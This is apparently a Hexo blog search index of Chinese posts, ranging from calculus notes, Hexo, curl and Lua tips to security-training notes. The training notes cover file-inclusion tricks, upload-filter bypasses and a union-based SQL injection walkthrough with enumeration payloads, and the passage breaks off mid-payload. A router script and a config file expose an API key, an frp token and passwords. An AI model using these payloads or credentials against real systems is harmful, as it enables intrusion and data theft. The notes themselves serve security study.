<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1000t</title>
      <link href="/2021/08/13/1000t/"/>
      <url>/2021/08/13/1000t/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章">第一章</h2><h3 id="A组">A组</h3><blockquote><p>4 D</p><blockquote><p>讨论极限时刻牢记x<sub>0</sub>的左右两边相等</p></blockquote><p>16</p><blockquote><p>可以通分的先通分</p></blockquote></blockquote><h3 id="B组">B组</h3><blockquote><p>4</p><blockquote><p>利用除法来判断函数的阶数</p><p>遇到无法求导的式子，可以在分式的另一边求导（洛必达）</p></blockquote><p>13</p><blockquote><p>利用三角恒等变换，凑形式</p></blockquote><p>15</p><blockquote><p>3</p><p>10</p><p>12</p><blockquote><p>幂指函数变形后的ln，除了可以用洛必达消去，还可以构造等价无穷小</p><p>熟记泰勒展开，灵活运用极限。有的时候可以直接计算极限取值</p></blockquote><p>13</p><blockquote><p>遇到三角函数，直接泰勒展开也可以做</p></blockquote><p>15</p><blockquote><p>常数减去无穷小量，可以优先计算，得到一个常数</p></blockquote><p>16</p><blockquote><p>如果对数前后出现加减法，考虑将加减的项化为ln( e<sup>I</sup> )形式，再利用对数运算法则化简</p></blockquote></blockquote><p>24</p></blockquote><h2 id="第二章">第二章</h2><h3 id="A组-2">A组</h3><blockquote><p>2</p><blockquote><p>（1+1/n)<sup>n</sup> =e<sup>n</sup></p></blockquote><p>4</p><blockquote><p>证明极限存在并求值：</p><p>直接求值，能求出来即可说明存在</p><p>单调有界数列必有极限</p></blockquote></blockquote><h3 id="B组-2">B组</h3><blockquote><p>4</p><blockquote><p>夹逼准则</p></blockquote><p>5</p><blockquote><p>先斩后奏：</p><p>递推式两边同时取极限</p></blockquote></blockquote><h2 id="第三章">第三章</h2><h3 id="A组-3">A组</h3><blockquote><p>5</p><blockquote><p>微分定义：</p><p>Δy-dy / Δx → 0</p></blockquote><p>9</p><blockquote><p>证明可导：用定义</p><p>证明连续：初等函数</p></blockquote><p>10</p></blockquote><h3 id="B组-3">B组</h3><blockquote><p>4</p><blockquote><p>Δy= dy + o(Δx) = y’Δx + o(Δx)</p></blockquote></blockquote><h2 id="第四章">第四章</h2><h3 id="B组-4">B组</h3><blockquote><p>4</p><blockquote><p>牢记莱布尼兹公式</p></blockquote><p>5</p><blockquote><p>莱布尼兹公式和泰勒展开结合使用</p></blockquote><p>11</p><blockquote><p>反函数的导数等于原函数导数的倒数</p><p>反函数的二阶导等于反函数一阶导再求导，考虑凑微分</p></blockquote><p>15</p><blockquote><p>对数求导法：</p><p>对想象成、相除、开方、乘方的狮子，先取对数在求导；同时也可以同时化成指数函数再求导。</p></blockquote><p>16</p><blockquote><p>存在等价无穷小的利用 → 可能可以利用泰勒展开</p></blockquote></blockquote><h2 id="第五章">第五章</h2><h3 id="A组-4">A组</h3><blockquote><p>8</p><blockquote><p>斜渐近线的求法</p><ol><li>求 k = lim f(x) / x</li><li>求 b = f(x) - kx</li></ol></blockquote><p>9</p><blockquote><p>曲率公式</p><p><img src="https://i.loli.net/2021/08/30/giHtn8JE1sUSdl2.png" alt="image-20210830201634395"></p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 高数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo图片宽度调整</title>
      <link href="/2021/08/10/hexo-img/"/>
      <url>/2021/08/10/hexo-img/</url>
      
        <content type="html"><![CDATA[<h1>Hexo图片宽度调整</h1><p>Hexo在解析md文件里的图片内容时，只将图片的url或地址直白地转换为html语法中的img标签，而没有对图片宽度做限制。当上传图片大小大于Hexo模板的文本容器宽度时，会使得图片超出容器外，破坏网页美观。</p><p>简单试验后发现，在生成的html文件内，对图片img标签加入style="max-width: "属性可以限制图片宽度。于是尝试修改Hexo模板引擎。</p><blockquote><p>模板引擎的作用，就是将界面与数据分离。最简单的原理是将模板内容中指定的地方替换成数据，实现业务代码与逻辑代码分离。数据的填充主要是 hexo -g 的时候将数据(.md文件)传递给 ejs 模板，然后再由 ejs 模板填充到 HTML 中。</p></blockquote><p>因此可以有以下几种方法修改图片的大小：</p><ol><li>修改ejs模板中对img标签的处理，将图像的宽度限制记录在html中。</li><li>修改主题对应的js / css，由浏览器渲染调整图像大小。</li></ol><h2 id="尝试在js和css中添加宽度限制">尝试在js和css中添加宽度限制</h2><ol><li><p>使用jQurey为图像添加类和样式–&gt;失败</p></li><li><p>在matery主题中，作者使用了js文件对文章内容做初始化。修改响应js代码。因此可以借助jQuery设置元素的相关属性。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#articleContent img'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> imgPath <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span><span class="token string">'&lt;div class="img-item" data-src="'</span> <span class="token operator">+</span> imgPath <span class="token operator">+</span> <span class="token string">'" data-sub-html=".caption"&gt;&lt;/div&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//图片限制大小</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'max-width'</span><span class="token punctuation">,</span><span class="token string">'98%'</span><span class="token punctuation">)</span>    <span class="token comment">// 图片添加阴影</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"img-shadow img-margin img-width"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码的第5行为图片添加了不大于上层容器宽度98%的限制，采用max-width可以让原本低分辨率的图像保持正常大小显示。此外应该还有很多方式可以限制图片宽度，这里只使用了其中一种。</p><blockquote><p>这里只测试了markdown使用url引入图片的方式，理论上对于本地引入同样适用。</p></blockquote><p>修改前的图片：</p><p><img src="https://i.loli.net/2021/08/10/7mhqFckUOWK1ISN.png" alt="image-20210810183120037"></p><p>修改后的图片：</p><p><img src="https://i.loli.net/2021/08/10/x26kzltmI35McK1.png" alt="image-20210810182924802"></p></li></ol><h2 id="修改ejs模板">修改ejs模板</h2><p>我用的这款主题不是用ejs模板，而是使用js的方式添加图片的。也可能我对ejs的作用理解有误吧。总之这里就先摆烂不写了。</p><p><a href="https://littlezero.top/20190831what-is-Hexo/">梳理基于Hexo搭建博客的原理 | 小贪心 (littlezero.top)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些curl参数</title>
      <link href="/2021/08/10/curl-shou-ce/"/>
      <url>/2021/08/10/curl-shou-ce/</url>
      
        <content type="html"><![CDATA[<h2 id="i">-i</h2><p>显示响应头和html</p><h2 id="I">-I</h2><p>只显示响应头</p><h2 id="v">-v</h2><p>显示端口连接过程和请求头</p><h2 id="–trace-v">–trace / -v</h2><p>更加详细，可以调试</p><h2 id="X-x">-X / -x</h2><p>指定发送方法，如post</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -X POST --data "data=xxx" example.com/form.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="u">-u</h2><p>指定用户名和密码，转换为请求中的Authorization</p><h2 id="G">-G</h2><p>构造url查询，GET请求</p><h2 id="k">-k</h2><p>跳过ssl</p><h2 id="–form-F">–form / -F</h2><p>文件上传</p><h2 id="–user-agent-cookie-header-referer">–user-agent / --cookie / --header / --referer</h2><p>分别等价于 -A / -b / -H / -e<br>提供对应的信息</p><h2 id="c">-c</h2><p>将服务器提供的cookie写入文件</p><h2 id="d-data-data-urlencode">-d / --data / --data-urlencode</h2><p>发送post数据体，需要和-X POST一起用，最后一个还可以编码</p><h2 id="s">-s</h2><p>不输出错误和进度信息</p><h2 id="o-O">-o / -O</h2><p>保存成文件，小写的-o需要额外指定文件名，大写的使用原文件名</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训第三天文件包含</title>
      <link href="/2021/08/10/file-include/"/>
      <url>/2021/08/10/file-include/</url>
      
        <content type="html"><![CDATA[<h1>php</h1><p>文件包含，只包含一次</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include_once</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以反复包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回文件指针</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">fopen</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取到缓冲区、返回整数为文件长度</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">readfile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1>文件包含</h1><p>函数不经过过滤，动态包含文件，存在文件包含漏洞</p><h1>本地文件包含(LFI,local file include)</h1><ul><li>被包含文件需要在同一目录下</li><li>若不在同一目录，需要用相对或绝对路径</li><li>被包含页面后缀无论是什么，都会被当作php解析</li><li>include和require的区别：包含的文件不存在时，都会爆出绝对路径，但include后的命令会继续执行，require后的命令会停止执行。</li><li>对于后缀名限制，在php5.5一下版本可以使用%00截断字符</li></ul><h1>远程文件包含(RFI)</h1><p>属于代码注入</p><p>当phpinfo中的url_fopen或url_include为on状态时，可以使用这两个函数来包含远程文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 四叶草实训 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训第三天</title>
      <link href="/2021/08/10/file-upload/"/>
      <url>/2021/08/10/file-upload/</url>
      
        <content type="html"><![CDATA[<h1>直接上传</h1><h1>前端绕过</h1><ul><li>禁用js，使前端验证失效</li><li>通过修改正常的请求或者重发，直接和后端交互，绕过前端</li></ul><h1>后端content type校验</h1><ul><li>通过修改Content type绕过后端对文件类型的验证</li><li>抓包修改后缀名</li></ul><h1>后端黑名单校验</h1><ul><li>修改php5、php3等其他可执行后缀名</li><li>大小写 .pHP、.PHP等</li><li>.htaccess(apache配置文件)</li><li>双写后缀名</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 四叶草实训 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次kali网卡修复</title>
      <link href="/2021/08/10/kali-eth/"/>
      <url>/2021/08/10/kali-eth/</url>
      
        <content type="html"><![CDATA[<p>查看网卡信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ifconfig -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改/etc/network/interfaces<br>加入</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">auto eth0iface eth0 inet dhcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win/unix等环境下代理的设置</title>
      <link href="/2021/08/10/proxy/"/>
      <url>/2021/08/10/proxy/</url>
      
        <content type="html"><![CDATA[<h1>powershell proxy</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set http_proxy=socks5://127.0.0.1:8848set https_proxy=socks5://127.0.0.1:8848<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1>linux</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export http_proxy=socks5://127.0.0.1:8848export https_proxy=socks5://127.0.0.1:8848<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1>git</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git config --global https.proxy http://127.0.0.1:1080git config --global https.proxy https://127.0.0.1:1080# unset_proxygit config --global --unset http.proxygit config --global --unset https.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由开机脚本配置</title>
      <link href="/2021/08/10/ip/"/>
      <url>/2021/08/10/ip/</url>
      
        <content type="html"><![CDATA[<p>##R7000 boot script</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># ipip=$(ifconfig -a|grep 10.170|awk '{print $2}'|tr -d "addr:")bark='https://api.day.app/Jmu8WBAjx7CDtKpidsQnzW/'group='?group=ip'curl $bark$ip$group# aria2/koolshare/aria2/aria2c --conf-path=/koolshare/aria2/aria2.conf -D# frp/koolshare/bin/frpc_linux_arm_garbage -f 2n6flw9stmhzj451:1061057,1061049<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lua语法记录</title>
      <link href="/2021/08/10/lua/"/>
      <url>/2021/08/10/lua/</url>
      
        <content type="html"><![CDATA[<h2 id="引入包">引入包</h2><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">json <span class="token operator">=</span> require <span class="token string">"json"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="可用的json实例">可用的json实例</h2><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"config_version"</span><span class="token operator">:</span><span class="token string">"0.36"</span><span class="token punctuation">,</span><span class="token property">"uri_rewrite_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"summary_request_enable"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"dashboard_host"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"redirect_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"cookie_prefix"</span><span class="token operator">:</span><span class="token string">"verynginx"</span><span class="token punctuation">,</span><span class="token property">"readonly"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"proxy_pass_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"proxy_pass_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"frequency_limit_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"filter_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"summary_with_host"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"browser_verify_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"browser_verify_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"static_file_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"scheme_lock_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"summary_group_temporary_enable"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"backend_upstream"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"summary_collect_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"redirect_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"matcher"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"arg_list"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"Args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"name_value"</span><span class="token operator">:</span><span class="token string">"arg1"</span><span class="token punctuation">,</span><span class="token property">"name_operator"</span><span class="token operator">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"v1"</span><span class="token punctuation">,</span><span class="token property">"operator"</span><span class="token operator">:</span><span class="token string">"≈"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"name_value"</span><span class="token operator">:</span><span class="token string">"arg2"</span><span class="token punctuation">,</span><span class="token property">"name_operator"</span><span class="token operator">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"v2"</span><span class="token punctuation">,</span><span class="token property">"operator"</span><span class="token operator">:</span><span class="token string">"≈"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"filter_enable"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"summary_group_persistent_enable"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"response"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"summary_temporary_period"</span><span class="token operator">:</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token property">"frequency_limit_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"admin"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"verynginx"</span><span class="token punctuation">,</span><span class="token property">"enable"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"user"</span><span class="token operator">:</span><span class="token string">"verynginx"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"11511"</span><span class="token punctuation">,</span><span class="token property">"enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"user"</span><span class="token operator">:</span><span class="token string">"11511"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"static_file_rule"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"mail"</span><span class="token operator">:</span><span class="token string">"${mail}"</span><span class="token punctuation">,</span><span class="token property">"scheme_lock_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"uri_rewrite_enable"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"base_uri"</span><span class="token operator">:</span><span class="token string">"/verynginx"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">json<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>json<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="获得table的长度">获得table的长度</h2><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token operator">#</span>table<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意lua中table的索引是从1开始的</p><h2 id="遍历一个列表型table">遍历一个列表型table</h2><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">#</span>table <span class="token keyword">do</span>    <span class="token function">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span> i <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="遍历一个字典型table">遍历一个字典型table</h2><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> pairs table <span class="token keyword">do</span>    <span class="token function">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1>取类型</h1><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span> <span class="token function">type</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'table'</span>    <span class="token keyword">then</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&gt;&gt;&gt;table</p>]]></content>
      
      
      
        <tags>
            
            <tag> lua </tag>
            
            <tag> verynginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用软件源</title>
      <link href="/2021/08/10/set-source/"/>
      <url>/2021/08/10/set-source/</url>
      
        <content type="html"><![CDATA[<h1>python</h1><h3 id="清华源">清华源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="阿里源">阿里源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="腾讯源">腾讯源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip config set global.index-url http://mirrors.cloud.tencent.com/pypi/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="豆瓣源">豆瓣源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip config set global.index-url http://pypi.douban.com/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1>opkg</h1><h3 id="清华">清华</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sed -i 's_downloads.openwrt.org_mirrors.tuna.tsinghua.edu.cn/openwrt_' /etc/opkg/distfeeds.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训第二天笔记</title>
      <link href="/2021/08/10/sql-inject/"/>
      <url>/2021/08/10/sql-inject/</url>
      
        <content type="html"><![CDATA[<h1>获取数据库数据</h1><h2 id="1-寻找注入点">1. 寻找注入点</h2><p>利用引号、括号等构造闭合，判断是否存在注入点。也可能没有保护，不需要构造闭合。</p><ul><li>可以用#和–+来构造注释</li></ul><h2 id="2-判断是否存在注入">2. 判断是否存在注入</h2><p>在闭合后的语句中插入1=1，查看该位置语句是否被运算</p><h2 id="3-判断当前表有多少列">3. 判断当前表有多少列</h2><p>利用order by ($数字) 来判断总共有多少列</p><p>闭合后语句如下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-判断显示位">4. 判断显示位</h2><p>借助union连接查询语句<br>将前半部分的查询(实际上为空)和后半部分语句拼接。<br>因为前半部分为空，所以实际会显示后半部分中的内容。因此可以看到实际上选择了id表中的哪几列。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>2，3</p></blockquote><h2 id="4-1-报错注入">4.1 报错注入</h2><p>当注入点位于登录框时，可能没有显示位但是能显示错误信息，此时可以使用报错注入。<br>mysql从5.1.5版本开始提供xml查询和修改函数。extractvalue和updatexml。</p><pre class="line-numbers language-none"><code class="language-none">UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二个参数要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。因此我们可以故意使它报错，将查询信息显示出来。</p><h2 id="5-查询数据库名">5. 查询数据库名</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>@localhost，security</p></blockquote><h2 id="6-查询数据库表名">6. 查询数据库表名</h2><p>在mysql5.0以上版本，默认有三个库：mysql、information_schema、performance_schema。infomation_schema中会记录库中的表名</p><ul><li>用户被存储在user表中</li><li>SCHEMATA中存储了mysql的所有库名</li><li>TABLES中存储了所有的表名</li><li>COLUMNS中存储了所有的列名</li></ul><p>借助一些语句，可以选择查看表中的某一项</p><ul><li>借助limit语句，可以限制查看第几个数据</li><li>借助group_concat，将多个表拼接在一起返回</li></ul><p>查询单个表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"security"</span> <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询所有表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"security"</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>emails,referers,uagents,users</p></blockquote><h2 id="7-查询某个表的所有列名">7. 查询某个表的所有列名</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span 